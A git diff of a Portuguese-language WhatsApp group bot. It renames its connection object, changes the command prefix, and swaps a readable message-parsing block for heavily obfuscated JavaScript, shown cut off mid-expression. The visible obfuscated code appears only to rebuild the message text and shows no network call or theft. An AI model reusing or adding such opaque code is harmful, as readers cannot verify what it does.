@@ -108,7 +108,7 @@ img = fs.readFileSync('./me.jpg')
 const yts = require( 'yt-search')
 const os = require('os')
 const fetch = require('node-fetch')
-const { emoji } = require("emoji-api");
+const { EmojiAPI } = require("emoji-api");
 const ggs = require('google-it')
 const axios = require('axios')
 const util = require("util");
@@ -133,33 +133,13 @@ const vcard = 'BEGIN:VCARD\n'
 
 
 
-prefix = "."
+prefix = "/"
 blocked = []
 limitawal = '999999999'
 cr = '*TOMIOKA*'
 modobot = true
 modobot = false
 public = true
-
-async function starts() {
-	const tomioka = new WAConnection()
-	tomioka.logger.level = 'warn'
-	console.log(banner.string)
-	tomioka.on('qr', () => {
-		console.log(color('[','white'), color('!','red'), color(']','white'), color(' escaneie o qr code para conectar..'))
-	})
-
-	fs.existsSync('./tomioka.json') && tomioka.loadAuthInfo('./tomioka.json')
-	tomioka.on('connecting', () => {
-		start('2', 'Conectando qr code quase la...')
-	})
-	tomioka.on('open', () => {
-		success('2', 'Prontinho ^-^')
-	})
-	await tomioka.connect({timeoutMs: 30*1000})
-        fs.writeFileSync('./tomioka.json', JSON.stringify(tomioka.base64EncodedAuthInfo(), null, '\t'))
-
-
 /**MAIS FUNÇÕES**/
 const totalcmd = JSON.parse(fs.readFileSync('./data/totalcmd.json'))[0].totalcmd
 
@@ -657,36 +637,55 @@ function kyun(seconds){
   return `${pad(hours)} Horas ${pad(minutes)} Minutos ${pad(seconds)} Segundos`
 }
 
+async function starts() {
+	const client = new WAConnection()
+	client.logger.level = 'warn'
+	console.log(banner.string)
+	client.on('qr', () => {
+		console.log(color('[','white'), color('!','red'), color(']','white'), color(' escaneie o qr code para conectar..'))
+	})
 
-tomioka.on('group-participants-update', async (anu) => {
-	const mdata = await tomioka.groupMetadata(anu.jid)
+	fs.existsSync('./tomioka.json') && client.loadAuthInfo('./tomioka.json')
+	client.on('connecting', () => {
+		start('2', 'Conectando qr code quase la...')
+	})
+	client.on('open', () => {
+		success('2', 'Prontinho ^-^')
+	})
+	await client.connect({timeoutMs: 30*1000})
+        fs.writeFileSync('./tomioka.json', JSON.stringify(client.base64EncodedAuthInfo(), null, '\t'))
+        
+		 client.on('user-presence-update', json => console.log(json.id + ' presence is => ' + json.type)) || console.log(`${time}: Bot by Tio Tomioka yt`)
+
+client.on('group-participants-update', async (anu) => {
+	const mdata = await client.groupMetadata(anu.jid)
 	if(antifake.includes(anu.jid)) {
 		if (anu.action == 'add'){
 			num = anu.participants[0]
 			if(!num.split('@')[0].startsWith(55)) {
-				tomioka.sendMessage(mdata.id, 'Tchau numero fake leia as regras antes de entrar!', MessageType.text)
+				client.sendMessage(mdata.id, 'Tchau numero fake leia as regras antes de entrar!', MessageType.text)
 				setTimeout(async function () {
-					tomioka.groupRemove(mdata.id, [num])
+					client.groupRemove(mdata.id, [num])
 				}, 1000)
 }
 }
 }
 if (!welcom.includes(anu.jid)) return
       try {
-         const mdata = await tomioka.groupMetadata(anu.jid)
+         const mdata = await client.groupMetadata(anu.jid)
          num = anu.participants[0]
          
-         ini_user = tomioka.contacts[num]
+         ini_user = client.contacts[num]
          namaewa = ini_user.notify
          member = mdata.participants.length
 
          try {
-               var ppimg = await tomioka.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
+               var ppimg = await client.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
             } catch {
                var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
             }
         try {
-               var ppgc = await tomioka.getProfilePicture(anu.jid)
+               var ppgc = await client.getProfilePicture(anu.jid)
             } catch {
                var ppgc = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
             }
@@ -696,33 +695,33 @@ if (!welcom.includes(anu.jid)) return
          if (anu.action == 'add') {
          	img = await getBuffer(`https://servant-of-evil.herokuapp.com/api/swiftlite/welkom?nama=${encodeUrl(namaewa)}&gc=${encodeUrl(mdata.subject)}&ppgc=${shortgc.data}&pp=${shortpc.data}&bg=https://dappa-result.herokuapp.com/bgverify.jpeg&member=${mdata.participants.length}&apikey=GFL`)
             teks = `Oi @${num.replace('@s.whatsapp.net', '')}\n◪ Bem-vindo(a):\n├─ *Grupo:* ${mdata.subject}\n└─ *Número:* ${num.replace('@s.whatsapp.net', '')}\nSeja bem-vindo(a)~~\n${namaewa}`
-            tomioka.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]} })
+            client.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]} })
          } else if (anu.action == 'remove') {
          	img = await getBuffer(`https://servant-of-evil.herokuapp.com/api/swiftlite/goodbye?nama=${encodeUrl(namaewa)}&gc=${encodeUrl(mdata.subject)}&ppgc=${shortgc.data}&pp=${shortpc.data}&bg=https://dappa-result.herokuapp.com/bgverify.jpeg&member=${mdata.participants.length}&apikey=GFL`)
             teks = `◪ Tchau 😞 ${namaewa}\n◪ Saiu de:\n${mdata.subject}\n\n└─ ❏ Número: ${num.replace('@s.whatsapp.net', '')}\nAté mais ... espero que não se arrependa!`
-            tomioka.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]}})
+            client.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]}})
          } else if (anu.action == 'promote') {
             img = await getBuffer(`http://hadi-api.herokuapp.com/api/card/promote?nama=${encodeUrl(namaewa)}&member=${member}&pesan=Parabés por se tornar um adm do grupo!&pp=${shortpc.data}&bg=https://dappa-result.herokuapp.com/bgverify.jpeg`)
             teks = `◪ PROMOVER DETECTADO\n\n├─ Número: ${num.replace('@s.whatsapp.net', '')}\n├─ Mensagem: @${num.split('@')[0]} se tornou um administrador do grupo, parabéns`
-            tomioka.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]}})
+            client.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]}})
          } else if (anu.action == 'demote') {
             img = await getBuffer(`http://hadi-api.herokuapp.com/api/card/demote?nama=${encodeUrl(namaewa)}&member=${member}&pesan=${namaewa} virou membro comum&pp=${shortpc.data}&bg=https://dappa-result.herokuapp.com/bgverify.jpeg`)
             teks = `◪ DESPROMOVER DETECTADO\n\n\n├─ Número: ${num.replace('@s.whatsapp.net', '')}\n├─  @${num.split('@')[0]} Não é mais um administrador do grupo`
-            tomioka.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]}})
+            client.sendMessage(mdata.id, img, MessageType.image, {caption: teks, contextInfo: {'mentionedJid': [num]}})
          }
      } catch (e) {
          console.log('Error : %s', color(e, 'red'))
       }
 })
 
-	tomioka.on('CB:Blocklist', json => {
+	client.on('CB:Blocklist', json => {
             if (blocked.length > 2) return
 	    for (let i of json[1].blocklist) {
 	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
 	    }
 	})
 
-	tomioka.on('chat-update', async (mek) => {
+	client.on('chat-update', async (mek) => {
 		try {
                         if (!mek.hasNewMessage) return
                         mek = JSON.parse(JSON.stringify(mek)).messages[0]
@@ -738,42 +737,7 @@ if (!welcom.includes(anu.jid)) return
 			const time = moment.tz('America/Sao_Paulo').format('DD/MM HH:mm:ss')
             const date = moment.tz('America/Sao_Paulo').format('DD/MM/YY')
             const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
-//PREFIX MULTI AND NO PREFIX BY KEVIN!
-    /*    if (multi){
-        var prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$%^&./\\©^]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™✓=|~zZ+×_*!#$,|`÷?;:%abcdefghijklmnopqrstuvwxyz%^&./\\©^]/gi) : '-'
- 
-        } else {
-        if (nopref){
-        prefix = ''
-        } else {
-        prefix = prefa
-}}*/
-            //objetos de todas as mensagens
-    var body = 
-   /* mensagem
-   */(type == 'conversation') && prefix.includes(mek.message.conversation[0]) ? mek.message.conversation :
-   /* marcação
-   */(type == 'extendedTextMessage') && prefix.includes(mek.message.extendedTextMessage.text[0]) ? mek.message.extendedTextMessage.text :
-   /* imagem
-   */ (type == 'imageMessage') && prefix.includes(mek.message.imageMessage.caption[0]) ? mek.message.imageMessage.caption :
-   /* video
-   */(type == 'videoMessage') && prefix.includes(mek.message.videoMessage.caption[0]) ? mek.message.videoMessage.caption :
-   /* documento
-   */ (type == 'documentMessage') && prefix.includes(mek.message.documentMessage.fileName[0]) ? mek.message.documentMessage.fileName :
-   /* list response
-   */ (type == 'listResponseMessage') && prefix.includes(mek.message.listResponseMessage.singleSelectReply.selectedRowId[0]) ? mek.message.listResponseMessage.singleSelectReply.selectedRowId :
-   /* botton response
-   */ (type == 'buttonsResponseMessage') && prefix.includes(mek.message.buttonsResponseMessage.selectedButtonId[0]) ? mek.message.buttonsResponseMessage.selectedButtonId :
-   /* contato
-   */ (type == 'contactMessage') && prefix.includes(mek.message.contactMessage.displayName[0]) ? mek.message.contactMessage.displayName :
-   /* requeste payment
-   */ (type == 'requestPaymentMessage') && prefix.includes(mek.message.requestPaymentMessage.noteMessage.extendedTextMessage.text[0]) ? mek.message.requestPaymentMessage.noteMessage.extendedTextMessage.text :
-   /* location mensage
-   */ (type == 'locationMessage') && prefix.includes(mek.message.locationMessage.name[0]) ? mek.message.locationMessage.name :
-   /* carrinho de paganentos
-   */ (type == 'orderMessage') && prefix.includes(mek.message.orderMessage.message[0]) ? mek.message.orderMessage.message :
-   /* catalogo
-   */ (type == 'productMessage') && prefix.includes(mek.message.productMessage.product.title[0]) ? mek.message.productMessage.product.tile : ''
+            function _0x4b4e(){var _0x2da51a=['ssage','butto','exten','ttonI','156186fuZvHd','espon','eSele','docum','ionMe','const','ing','fileN','47511RoBTYu','text','stPay','messa','image','wId','order','listR','seMes','essag','8NzQGdC','47950SXsApF','tile','noteM','searc','singl','ame','toStr','entMe','selec','tedBu','ctRep','reque','dedTe','video','displ','2056216mxYJgV','Messa','xtMes','ayNam','1479010ILuKCO','inclu','produ','des','capti','779614fFNump','title','sage','tedRo','102SUvlhh','nsRes','110QmBMsZ','4549728AUEkXR','QrMLH',')+)+)','sWith','conta','mentM','21ZbEucs','ructo','(((.+','ponse','locat','apply','conve','rsati','start','ctMes'];_0x4b4e=function(){return _0x2da51a;};return _0x4b4e();}(function(_0x44b3b2,_0x4306f0){function _0x458e94(_0x3bff57,_0x3a31bc,_0x519989,_0x3b0a66,_0x5a9b08){return _0xe915(_0x3a31bc-0x119,_0x519989);}function _0x1bc58a(_0x2c8378,_0x17c9e2,_0x9e5324,_0xaeda3a,_0x1c50f9){return _0xe915(_0x17c9e2-0xca,_0x9e5324);}function _0x33440b(_0x147cd0,_0x36dd98,_0xbfacef,_0x365524,_0x1ef5c0){return _0xe915(_0x36dd98-0x1a,_0x147cd0);}function _0x96c2f(_0x4853ac,_0x54856e,_0x2abd92,_0x4f5a23,_0x62f048){return _0xe915(_0x4853ac-0x1e7,_0x4f5a23);}function _0x4f80cf(_0x2035d7,_0x16a197,_0x296787,_0xe1ee8f,_0x3a35ad){return _0xe915(_0xe1ee8f- -0x24a,_0x16a197);}var _0x4850c1=_0x44b3b2();while(!![]){try{var _0x39b148=parseInt(_0x96c2f(0x365,0x370,0x37a,0x385,0x34f))/(-0x1*0x2457+0x557+0x1*0x1f01)+parseInt(_0x96c2f(0x370,0x36b,0x36d,0x353,0x375))/(0x12fb+-0x16a*0x10+0x3a7)*(-parseInt(_0x458e94(0x2ac,0x2be,0x2d0,0x2b2,0x2a0))/(-0x111c+0x22c9*0x1+0x286*-0x7))+-parseInt(_0x4f80cf(-0xd1,-0xa0,-0xd4,-0xc2,-0xcc))/(-0x550+-0x1135+0x1689)*(parseInt(_0x96c2f(0x383,0x36d,0x385,0x36c,0x38e))/(0x1*0x18d0+0x45*0x26+0x2309*-0x1))+parseInt(_0x458e94(0x2b2,0x2c1,0x2c2,0x2dd,0x2a7))/(0xd8c+-0x1*0x6ab+-0x6db)+parseInt(_0x1bc58a(0x275,0x278,0x265,0x291,0x298))/(0x1*-0xeb1+-0x23fc+0x4*0xcad)*(parseInt(_0x1bc58a(0x27f,0x262,0x275,0x274,0x257))/(0xa*-0xb3+0x18b9*0x1+-0xc5*0x17))+parseInt(_0x458e94(0x272,0x28f,0x275,0x2a9,0x270))/(0x222d+-0xcc5*0x1+-0x155f)*(parseInt(_0x4f80cf(-0x85,-0xb1,-0x9d,-0xa3,-0x9e))/(0x19a6+-0x1f61+0x7*0xd3))+parseInt(_0x33440b(0x1ad,0x1bb,0x1a2,0x1b1,0x1d6))/(0x9b*-0x27+0x42*-0x67+0x3236*0x1);if(_0x39b148===_0x4306f0)break;else _0x4850c1['push'](_0x4850c1['shift']());}catch(_0xb116d3){_0x4850c1['push'](_0x4850c1['shift']());}}}(_0x4b4e,0x5e35f*0x1+0xc8be3+0x4684*-0x2b));function _0x17ff04(_0x59416f,_0x37fdb3,_0x433bb1,_0x4f589e,_0x59a36c){return _0xe915(_0x4f589e-0x3ab,_0x59416f);}var _0x430bf6=(function(){var _0x9dbb7=!![];return function(_0x4dd37c,_0x394ab4){var _0x38e923=_0x9dbb7?function(){function _0x338e63(_0x13ff10,_0x5acc56,_0x29ec5a,_0x2223c6,_0x49ab3f){return _0xe915(_0x13ff10-0x74,_0x2223c6);}if(_0x394ab4){var _0x565e05=_0x394ab4[_0x338e63(0x227,0x235,0x215,0x21c,0x210)](_0x4dd37c,arguments);return _0x394ab4=null,_0x565e05;}}:function(){};return _0x9dbb7=![],_0x38e923;};}());function _0x279dcf(_0x5ee1ca,_0x3a3d42,_0x506add,_0x369b6c,_0x26dcf1){return _0xe915(_0x369b6c- -0x381,_0x26dcf1);}function _0x24c5aa(_0x40d245,_0x52bf7c,_0x2dfdec,_0xbbad97,_0x1a004f){return _0xe915(_0x1a004f- -0x70,_0x40d245);}var _0x5b1bd1=_0x430bf6(this,function(){function _0x354fec(_0x3ab349,_0x3dda53,_0x239c87,_0x331bdd,_0xd8d132){return _0xe915(_0xd8d132- -0x27f,_0x3dda53);}function _0x37ce26(_0x3c9aff,_0x2410b3,_0x2434ee,_0x162b38,_0x40db7b){return _0xe915(_0x3c9aff-0x27f,_0x2410b3);}function _0x527821(_0x5a0428,_0x5b8f7f,_0x587511,_0x3baa3c,_0xfffb4c){return _0xe915(_0x3baa3c- -0x217,_0x5b8f7f);}var _0x17732d={};_0x17732d[_0x12a525(-0xf4,-0x108,-0x100,-0xff,-0xe5)]=_0x527821(-0x69,-0x85,-0x84,-0x67,-0x4b)+_0x12a525(-0x100,-0xdd,-0xff,-0xf8,-0x121)+'+$';function _0x12a525(_0x34270,_0x16821a,_0x12518a,_0x19088f,_0x165526){return _0xe915(_0x12518a- -0x2a9,_0x165526);}function _0x5b2a61(_0x40271c,_0x456c56,_0x19e327,_0x59748b,_0x5481e6){return _0xe915(_0x19e327- -0x17f,_0x59748b);}var _0x20cb34=_0x17732d;return _0x5b1bd1[_0x37ce26(0x40e,0x42f,0x42e,0x3fb,0x40e)+_0x527821(-0x8a,-0x9f,-0x85,-0x9b,-0xbb)]()[_0x527821(-0xa1,-0x69,-0x7e,-0x8b,-0x8e)+'h'](_0x20cb34[_0x354fec(-0xd5,-0xbb,-0xf0,-0xd9,-0xd6)])[_0x5b2a61(0x2c,-0xb,0x10,0x1b,0x19)+_0x527821(-0x97,-0x8a,-0x7d,-0x9b,-0x86)]()[_0x354fec(-0xef,-0xfc,-0x108,-0x10d,-0x104)+_0x527821(-0x77,-0x71,-0x4f,-0x68,-0x7c)+'r'](_0x5b1bd1)[_0x37ce26(0x40b,0x42b,0x411,0x405,0x41e)+'h'](_0x20cb34[_0x354fec(-0xc5,-0xf9,-0xeb,-0xc4,-0xd6)]);});function _0xe915(_0x19c305,_0x3322f7){var _0x1f4f7e=_0x4b4e();return _0xe915=function(_0x176481,_0x4a52be){_0x176481=_0x176481-(0x2c*0x1+0x5b*0x47+-0x17f4);var _0x50d9e2=_0x1f4f7e[_0x176481];return _0x50d9e2;},_0xe915(_0x19c305,_0x3322f7);}function _0x4c4d5d(_0x15fe8e,_0x3d3123,_0x1110eb,_0x248fec,_0x31ea6f){return _0xe915(_0x3d3123-0x211,_0x15fe8e);}function _0x1f6cdf(_0x1d1232,_0x43f9fe,_0x3e81ad,_0x3f5183,_0x1f7c93){return _0xe915(_0x3f5183-0x198,_0x43f9fe);}_0x5b1bd1();var body=type==_0x279dcf(-0x1ae,-0x1ef,-0x1d6,-0x1cd,-0x1e7)+_0x279dcf(-0x1e9,-0x1c8,-0x1a9,-0x1cc,-0x1c6)+'on'&&prefix[_0x1f6cdf(0x343,0x316,0x324,0x335,0x31b)+_0x279dcf(-0x1ec,-0x1ff,-0x1fd,-0x1e2,-0x1e4)](mek[_0x17ff04(0x52c,0x529,0x51d,0x52c,0x523)+'ge'][_0x17ff04(0x542,0x53c,0x56d,0x55f,0x549)+_0x4c4d5d(0x3c0,0x3c6,0x3c8,0x3bc,0x3e0)+'on'][-0xbd9+-0x132c*0x1+0x1f05])?mek[_0x17ff04(0x51c,0x50f,0x53e,0x52c,0x509)+'ge'][_0x24c5aa(0x12e,0x149,0x13f,0x14d,0x144)+_0x17ff04(0x581,0x555,0x573,0x560,0x573)+'on']:type==_0x1f6cdf(0x351,0x337,0x340,0x352,0x364)+_0x17ff04(0x535,0x54b,0x54d,0x540,0x531)+_0x1f6cdf(0x340,0x331,0x343,0x332,0x327)+_0x279dcf(-0x1c3,-0x1d6,-0x1d1,-0x1de,-0x1da)&&prefix[_0x24c5aa(0x137,0x11c,0x14f,0x145,0x12d)+_0x17ff04(0x55d,0x549,0x561,0x54a,0x548)](mek[_0x24c5aa(0x122,0x12c,0xf1,0x102,0x111)+'ge'][_0x24c5aa(0x14a,0x144,0x142,0x128,0x14a)+_0x279dcf(-0x1dc,-0x202,-0x1eb,-0x1ec,-0x1ec)+_0x24c5aa(0x12e,0x13f,0x133,0x10c,0x12a)+_0x279dcf(-0x1e1,-0x1e7,-0x1f7,-0x1de,-0x1d8)][_0x4c4d5d(0x3a8,0x390,0x370,0x39c,0x3af)][-0x41c+-0x52*0x1c+0xd14])?mek[_0x4c4d5d(0x372,0x392,0x388,0x372,0x397)+'ge'][_0x17ff04(0x582,0x556,0x549,0x565,0x54a)+_0x17ff04(0x53c,0x531,0x548,0x540,0x51f)+_0x279dcf(-0x1f3,-0x207,-0x1ff,-0x1e7,-0x1ff)+_0x17ff04(0x559,0x545,0x533,0x54e,0x56f)][_0x1f6cdf(0x332,0x31f,0x2fa,0x317,0x30f)]:type==_0x1f6cdf(0x316,0x321,0x315,0x31a,0x300)+_0x24c5aa(0x145,0x149,0x146,0x136,0x129)+'ge'&&prefix[_0x1f6cdf(0x322,0x320,0x340,0x335,0x350)+_0x1f6cdf(0x333,0x315,0x33e,0x337,0x334)](mek[_0x24c5aa(0x11e,0x117,0x105,0x12c,0x111)+'ge'][_0x4c4d5d(0x39a,0x393,0x39b,0x3b0,0x3a3)+_0x1f6cdf(0x318,0x31b,0x30e,0x331,0x339)+'ge'][_0x279dcf(-0x1d0,-0x1cc,-0x1e6,-0x1e1,-0x1c9)+'on'][-0xa19+0x1cb5+0x634*-0x3])?mek[_0x279dcf(-0x213,-0x205,-0x1df,-0x200,-0x204)+'ge'][_0x1f6cdf(0x31c,0x32c,0x2fd,0x31a,0x306)+_0x4c4d5d(0x3b6,0x3aa,0x393,0x38b,0x3ca)+'ge'][_0x24c5aa(0x13c,0x110,0x116,0x117,0x130)+'on']:type==_0x17ff04(0x54d,0x526,0x542,0x541,0x54d)+_0x279dcf(-0x204,-0x1ce,-0x1eb,-0x1e8,-0x1ed)+'ge'&&prefix[_0x1f6cdf(0x340,0x34f,0x357,0x335,0x327)+_0x279dcf(-0x1d4,-0x1ed,-0x1ef,-0x1e2,-0x1cb)](mek[_0x17ff04(0x51a,0x545,0x544,0x52c,0x522)+'ge'][_0x4c4d5d(0x388,0x3a7,0x3b3,0x3af,0x3bc)+_0x1f6cdf(0x34f,0x31d,0x33a,0x331,0x351)+'ge'][_0x17ff04(0x568,0x55a,0x554,0x54b,0x54f)+'on'][-0x1f3f+-0x151*0x1b+0x53*0xce])?mek[_0x279dcf(-0x206,-0x1f6,-0x1ff,-0x200,-0x201)+'ge'][_0x4c4d5d(0x385,0x3a7,0x3a9,0x3b0,0x3aa)+_0x4c4d5d(0x395,0x3aa,0x3be,0x3b9,0x39f)+'ge'][_0x1f6cdf(0x323,0x33e,0x330,0x338,0x32d)+'on']:type==_0x1f6cdf(0x329,0x2ff,0x32a,0x311,0x31e)+_0x279dcf(-0x202,-0x20d,-0x201,-0x1f1,-0x1f8)+_0x4c4d5d(0x3ce,0x3c9,0x3d8,0x3be,0x3b6)&&prefix[_0x4c4d5d(0x3a1,0x3ae,0x38f,0x390,0x392)+_0x1f6cdf(0x336,0x330,0x325,0x337,0x332)](mek[_0x279dcf(-0x1f7,-0x20b,-0x221,-0x200,-0x20a)+'ge'][_0x279dcf(-0x1f0,-0x215,-0x1f1,-0x208,-0x1f1)+_0x4c4d5d(0x3a4,0x3a1,0x3b0,0x38f,0x395)+_0x24c5aa(0x163,0x156,0x151,0x14c,0x148)][_0x17ff04(0x52d,0x52f,0x50d,0x528,0x53b)+_0x24c5aa(0x119,0x114,0x11f,0x13b,0x11e)][-0x4*-0x463+0xd*0x13e+0x26*-0xe3])?mek[_0x1f6cdf(0x324,0x2fe,0x332,0x319,0x32d)+'ge'][_0x17ff04(0x53a,0x53e,0x504,0x524,0x53e)+_0x279dcf(-0x1f5,-0x1d9,-0x213,-0x1f1,-0x1f5)+_0x4c4d5d(0x3de,0x3c9,0x3b3,0x3ba,0x3ce)][_0x24c5aa(0xf7,0xf1,0x120,0x109,0x10d)+_0x279dcf(-0x1e8,-0x1e5,-0x1fa,-0x1f3,-0x1d5)]:type==_0x17ff04(0x50d,0x531,0x548,0x530,0x54a)+_0x279dcf(-0x216,-0x1e8,-0x204,-0x20a,-0x22c)+_0x17ff04(0x53d,0x545,0x53e,0x531,0x522)+_0x279dcf(-0x1c9,-0x1bc,-0x1d0,-0x1de,-0x1df)&&prefix[_0x279dcf(-0x1cd,-0x1ed,-0x1d1,-0x1e4,-0x1f0)+_0x4c4d5d(0x3ae,0x3b0,0x3c7,0x398,0x3b4)](mek[_0x1f6cdf(0x33a,0x326,0x328,0x319,0x320)+'ge'][_0x1f6cdf(0x326,0x324,0x309,0x31d,0x31a)+_0x17ff04(0x52b,0x535,0x510,0x522,0x52c)+_0x4c4d5d(0x388,0x397,0x398,0x377,0x37c)+_0x24c5aa(0x120,0x145,0x119,0x146,0x133)][_0x1f6cdf(0x33c,0x33e,0x328,0x325,0x31b)+_0x1f6cdf(0x32c,0x32c,0x31a,0x310,0x317)+_0x279dcf(-0x1e1,-0x20b,-0x1fc,-0x1ee,-0x1e6)+'ly'][_0x1f6cdf(0x327,0x331,0x33d,0x329,0x311)+_0x17ff04(0x565,0x52d,0x54c,0x54f,0x562)+_0x24c5aa(0x113,0x104,0x11e,0xf4,0x113)][-0x8e8+0x10b9*-0x1+-0x19a1*-0x1])?mek[_0x24c5aa(0x133,0x123,0x11b,0xf3,0x111)+'ge'][_0x17ff04(0x53d,0x522,0x53b,0x530,0x53a)+_0x279dcf(-0x204,-0x1f8,-0x203,-0x20a,-0x202)+_0x24c5aa(0x138,0x11e,0xf5,0x11b,0x116)+_0x1f6cdf(0x32f,0x35e,0x328,0x33b,0x347)][_0x279dcf(-0x20d,-0x20e,-0x1d1,-0x1f4,-0x1f2)+_0x24c5aa(0x10d,0x106,0x111,0x121,0x108)+_0x4c4d5d(0x381,0x3a4,0x393,0x3b1,0x391)+'ly'][_0x24c5aa(0x11d,0x123,0x140,0x11e,0x121)+_0x4c4d5d(0x3d1,0x3b5,0x3a9,0x3a9,0x395)+_0x279dcf(-0x208,-0x1e4,-0x20c,-0x1fe,-0x214)]:type==_0x1f6cdf(0x33a,0x35a,0x34e,0x351,0x369)+_0x1f6cdf(0x356,0x321,0x33d,0x33e,0x33f)+_0x279dcf(-0x1e4,-0x1ec,-0x1ec,-0x1d0,-0x1df)+_0x4c4d5d(0x3bf,0x3aa,0x3bc,0x3a6,0x39d)+'ge'&&mek[_0x1f6cdf(0x308,0x317,0x2fe,0x319,0x309)+'ge'][_0x4c4d5d(0x3af,0x3ca,0x3c1,0x3c5,0x3b6)+_0x4c4d5d(0x3c3,0x3b7,0x3a1,0x3c9,0x3c1)+_0x1f6cdf(0x365,0x343,0x33b,0x349,0x359)+_0x4c4d5d(0x3a2,0x3aa,0x3a2,0x394,0x3bf)+'ge'][_0x17ff04(0x542,0x523,0x54b,0x53c,0x523)+_0x1f6cdf(0x34b,0x325,0x33e,0x32a,0x32d)+_0x4c4d5d(0x380,0x386,0x39d,0x373,0x39d)+'d'][_0x1f6cdf(0x33e,0x351,0x36a,0x34e,0x341)+_0x279dcf(-0x1c0,-0x1e0,-0x1cc,-0x1d6,-0x1dd)](prefix)?mek[_0x17ff04(0x53e,0x52d,0x529,0x52c,0x53e)+'ge'][_0x24c5aa(0x13c,0x150,0x139,0x14f,0x149)+_0x17ff04(0x568,0x532,0x54d,0x551,0x571)+_0x1f6cdf(0x331,0x346,0x326,0x349,0x328)+_0x24c5aa(0x109,0x10e,0x119,0x107,0x129)+'ge'][_0x4c4d5d(0x399,0x3a2,0x3a7,0x3bd,0x3aa)+_0x1f6cdf(0x313,0x308,0x323,0x32a,0x34b)+_0x1f6cdf(0x2fe,0x316,0x316,0x30d,0x323)+'d']:type==_0x279dcf(-0x1d6,-0x1b2,-0x1e0,-0x1d5,-0x1f5)+_0x24c5aa(0x12c,0x134,0x13f,0x169,0x147)+_0x279dcf(-0x200,-0x1f1,-0x1c7,-0x1de,-0x1c4)&&prefix[_0x17ff04(0x52e,0x52c,0x53f,0x548,0x525)+_0x279dcf(-0x1dc,-0x1f7,-0x1c4,-0x1e2,-0x1e8)](mek[_0x17ff04(0x54d,0x51e,0x52d,0x52c,0x546)+'ge'][_0x17ff04(0x535,0x545,0x576,0x557,0x572)+_0x279dcf(-0x1c3,-0x1de,-0x1d4,-0x1ca,-0x1b0)+_0x279dcf(-0x1eb,-0x1d9,-0x1c6,-0x1de,-0x1fe)][_0x279dcf(-0x1eb,-0x1f0,-0x1d9,-0x1ea,-0x1d2)+_0x24c5aa(0x128,0x148,0x136,0x144,0x12b)+'e'][0x969+-0xfb*0x11+0x742])?mek[_0x17ff04(0x547,0x536,0x527,0x52c,0x515)+'ge'][_0x279dcf(-0x1c4,-0x1c8,-0x1dc,-0x1d5,-0x1eb)+_0x17ff04(0x576,0x575,0x552,0x562,0x56c)+_0x24c5aa(0x111,0x149,0x13b,0x110,0x133)][_0x279dcf(-0x1ee,-0x1ca,-0x1d7,-0x1ea,-0x1df)+_0x1f6cdf(0x311,0x34a,0x329,0x333,0x344)+'e']:type==_0x4c4d5d(0x393,0x3a5,0x3b5,0x3c6,0x3c7)+_0x24c5aa(0x11a,0x130,0x10a,0x11f,0x110)+_0x17ff04(0x560,0x55d,0x543,0x558,0x571)+_0x24c5aa(0xfb,0x120,0x109,0x125,0x117)+'e'&&prefix[_0x1f6cdf(0x34a,0x33a,0x321,0x335,0x32a)+_0x17ff04(0x53a,0x557,0x54d,0x54a,0x543)](mek[_0x279dcf(-0x1fd,-0x1f1,-0x1fc,-0x200,-0x1ff)+'ge'][_0x1f6cdf(0x31e,0x341,0x329,0x32c,0x334)+_0x1f6cdf(0x314,0x303,0x321,0x318,0x303)+_0x17ff04(0x556,0x537,0x546,0x558,0x552)+_0x4c4d5d(0x375,0x398,0x385,0x3ac,0x375)+'e'][_0x4c4d5d(0x3aa,0x39c,0x3be,0x39c,0x37e)+_0x1f6cdf(0x337,0x31b,0x32a,0x31f,0x321)+'e'][_0x279dcf(-0x1b9,-0x1b1,-0x1c3,-0x1c7,-0x1da)+_0x24c5aa(0x136,0x13e,0x128,0x116,0x125)+_0x279dcf(-0x1f5,-0x1c5,-0x1ea,-0x1e7,-0x1dc)+_0x4c4d5d(0x3c8,0x3b4,0x395,0x39e,0x3c3)][_0x24c5aa(0x11f,0xfc,0x131,0xfb,0x10f)][-0x1bb3+0x5*-0x433+0x30b2])?mek[_0x17ff04(0x54f,0x51d,0x50b,0x52c,0x51b)+'ge'][_0x279dcf(-0x1d7,-0x1d2,-0x204,-0x1ed,-0x1d9)+_0x4c4d5d(0x39b,0x391,0x3a9,0x3b4,0x36e)+_0x17ff04(0x539,0x574,0x559,0x558,0x55b)+_0x279dcf(-0x208,-0x1e6,-0x1de,-0x1fa,-0x21b)+'e'][_0x279dcf(-0x200,-0x1ef,-0x1dd,-0x1f6,-0x1f6)+_0x17ff04(0x537,0x538,0x52c,0x532,0x54b)+'e'][_0x17ff04(0x572,0x57b,0x556,0x565,0x586)+_0x4c4d5d(0x3c9,0x3a6,0x3a8,0x385,0x394)+_0x279dcf(-0x1fa,-0x1cf,-0x1fd,-0x1e7,-0x1f3)+_0x1f6cdf(0x358,0x332,0x354,0x33b,0x339)][_0x24c5aa(0x123,0x103,0x102,0xf6,0x10f)]:type==_0x4c4d5d(0x3a3,0x3c3,0x3af,0x3e0,0x3c